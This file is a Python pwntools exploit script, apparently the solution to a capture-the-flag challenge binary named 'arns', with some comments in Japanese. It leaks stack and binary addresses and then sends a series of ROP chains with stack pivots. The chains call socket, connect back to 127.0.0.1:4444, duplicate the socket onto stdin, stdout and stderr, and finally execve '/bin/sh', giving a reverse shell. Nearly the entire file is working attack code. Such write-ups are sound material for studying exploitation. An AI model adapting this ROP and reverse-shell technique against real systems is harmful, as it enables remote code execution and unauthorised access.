#!/usr/bin/python3
from pwn import *
from struct import *

from pwnlib.util.net import sockaddr

context(arch='amd64', os='linux')
exe = ELF("../dist/all_rust_and_no_safe/arns")


def conn():
    r = remote('localhost', 8109)
    return r


def main():
    r = conn()

    r.sendlineafter(b'name: ', b'')
    data = r.recvn(0x38)  # b'Hello <0x30 bytes data>!\n'
    print(f'{data=}')
    r.close()
    data = data[len("Hello "):]

    addr_name = unpack('<Q', data[0x08:0x10])[0] - 0x98
    exe.address = unpack('<Q', data[0x10:0x18])[0] - 0x4a781
    rop = ROP(exe)
    print(f'{addr_name=:016x}')
    print(f'{exe.address=:016x}')

    addr_pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    addr_pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
    addr_pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
    addr_pop_rax = rop.find_gadget(["pop rax", "ret"]).address
    addr_pop_rsp = rop.find_gadget(["pop rsp", "ret"]).address
    addr_syscall = rop.find_gadget(["syscall", "ret"]).address
    addr_ret = rop.find_gadget(["ret"]).address
    addr_accept_loop = exe.address + 0x58f5  # acceptループの少し前
    print(f'{addr_pop_rdi=:016x}')
    print(f'{addr_pop_rsi=:016x}')
    print(f'{addr_pop_rdx=:016x}')
    print(f'{addr_pop_rax=:016x}')
    print(f'{addr_pop_rsp=:016x}')
    print(f'{addr_syscall=:016x}')
    print(f'{addr_ret=:016x}')

    # AF_INET, 127.0.0.1:4444
    sa = sockaddr("127.0.0.1", 4444)[0]
    # print(f"{sa=}")
    binsh = b'/bin/sh\x00'
    offset_ret = 0x60
    addr_name_ret = addr_name + offset_ret
    print(f'{addr_name_ret=:016x}')

    print("socket(AF_INET, SOCK_STREAM, 0)")
    payload = b""
    payload += pack('<Q', addr_pop_rdi)
    payload += pack('<Q', 2)  # AF_INET
    payload += pack('<Q', addr_pop_rsi)
    payload += pack('<Q', 1)  # SOCK_STREAM
    payload += pack('<Q', addr_pop_rdx)
    payload += pack('<Q', 0)  # 0
    payload += pack('<Q', addr_pop_rax)
    payload += pack('<Q', 41)  # syscall socket
    payload += pack('<Q', addr_syscall)
    payload += pack('<Q', addr_accept_loop)
    payload += pack('<I', 3)  # acceptループのsockfd
    payload += pack('<I', 0)
    payload += b'A' * (offset_ret - len(payload))
    payload += pack('<Q', addr_pop_rsp)  # stack pivot
    payload += pack('<Q', addr_name)  # rsp
    r = conn()
    r.sendlineafter(b'name: ', payload)
    r.recvn(0x38)
    r.close()

    # 無理矢理戻す都合上nameの位置が少しずれる
    addr_name -= 0x18

    print("connect(4, addr, 0x10)")
    payload = b""
    payload += pack('<Q', addr_pop_rdi)
    payload += pack('<Q', 4)  # sockfd(多分4になるはず)
    payload += pack('<Q', addr_pop_rsi)
    payload += pack('<Q', addr_name + 0x08*11)  # saのアドレス
    payload += pack('<Q', addr_pop_rdx)
    payload += pack('<Q', 0x10)  # sizeof(sockaddr_in)
    payload += pack('<Q', addr_pop_rax)
    payload += pack('<Q', 42)  # syscall connect
    payload += pack('<Q', addr_syscall)
    payload += pack('<Q', addr_accept_loop)
    payload += pack('<I', 3)  # acceptループのsockfd
    payload += pack('<I', 0)
    payload += sa
    payload += b'A' * (offset_ret - len(payload))
    payload += pack('<Q', addr_pop_rsp)  # stack pivot
    payload += pack('<Q', addr_name)  # rsp
    r = conn()
    r.sendlineafter(b'name: ', payload)
    r.recvn(0x38)
    r.close()

    addr_name -= 0x18

    print("dup2(4, STDIN_FILENO)")
    payload = b""
    payload += pack('<Q', addr_pop_rdi)
    payload += pack('<Q', 4)  # fd
    payload += pack('<Q', addr_pop_rsi)
    payload += pack('<Q', 0)  # STDIN_FILENO
    payload += pack('<Q', addr_pop_rax)
    payload += pack('<Q', 33)  # syscall dup2
    payload += pack('<Q', addr_pop_rax)
    payload += pack('<Q', 33)  # dummy (スタックの制御用)
    payload += pack('<Q', addr_syscall)
    payload += pack('<Q', addr_accept_loop)
    payload += pack('<I', 3)  # acceptループのsockfd
    payload += pack('<I', 0)
    payload += b'A' * (offset_ret - len(payload))
    payload += pack('<Q', addr_pop_rsp)  # stack pivot
    payload += pack('<Q', addr_name)  # rsp
    r = conn()
    r.sendlineafter(b'name: ', payload)
    r.recvn(0x38)
    r.close()

    addr_name -= 0x18

    print("dup2(4, STDOUT_FILENO)")
    payload = b""
    payload += pack('<Q', addr_pop_rdi)
    payload += pack('<Q', 4)  # fd
    payload += pack('<Q', addr_pop_rsi)
    payload += pack('<Q', 1)  # STDOUT_FILENO
    payload += pack('<Q', addr_pop_rax)
    payload += pack('<Q', 33)  # syscall dup2
    payload += pack('<Q', addr_pop_rax)
    payload += pack('<Q', 33)  # dummy (スタックの制御用)
    payload += pack('<Q', addr_syscall)
    payload += pack('<Q', addr_accept_loop)
    payload += pack('<I', 3)  # acceptループのsockfd
    payload += pack('<I', 0)
    payload += b'A' * (offset_ret - len(payload))
    payload += pack('<Q', addr_pop_rsp)  # stack pivot
    payload += pack('<Q', addr_name)  # rsp
    r = conn()
    r.sendlineafter(b'name: ', payload)
    r.recvn(0x38)
    r.close()

    addr_name -= 0x18

    print("dup2(4, STDERR_FILENO)")
    payload = b""
    payload += pack('<Q', addr_pop_rdi)
    payload += pack('<Q', 4)  # fd
    payload += pack('<Q', addr_pop_rsi)
    payload += pack('<Q', 2)  # STDERR_FILENO
    payload += pack('<Q', addr_pop_rax)
    payload += pack('<Q', 33)  # syscall dup2
    payload += pack('<Q', addr_pop_rax)
    payload += pack('<Q', 33)  # dummy (スタックの制御用)
    payload += pack('<Q', addr_syscall)
    payload += pack('<Q', addr_accept_loop)
    payload += pack('<I', 3)  # acceptループのsockfd
    payload += pack('<I', 0)
    payload += b'A' * (offset_ret - len(payload))
    payload += pack('<Q', addr_pop_rsp)  # stack pivot
    payload += pack('<Q', addr_name)  # rsp
    r = conn()
    r.sendlineafter(b'name: ', payload)
    r.recvn(0x38)
    r.close()

    addr_name -= 0x18

    print('execve("/bin/sh", NULL, NULL)')
    payload = b""
    payload += pack('<Q', addr_pop_rdi)
    payload += pack('<Q', addr_name + 0x08 * 10)  # addr of "/bin/sh"
    payload += pack('<Q', addr_pop_rsi)
    payload += pack('<Q', 0)  # NULL
    payload += pack('<Q', addr_pop_rdx)
    payload += pack('<Q', 0)  # NULL
    payload += pack('<Q', addr_pop_rax)
    payload += pack('<Q', 59)  # syscall execve
    payload += pack('<Q', addr_syscall)
    payload += pack('<Q', addr_accept_loop)
    payload += binsh
    payload += b'A' * (offset_ret - len(payload))
    payload += pack('<Q', addr_pop_rsp)  # stack pivot
    payload += pack('<Q', addr_name)  # rsp
    r = conn()
    r.sendlineafter(b'name: ', payload)
    r.recvn(0x38)
    r.close()


if __name__ == "__main__":
    main()
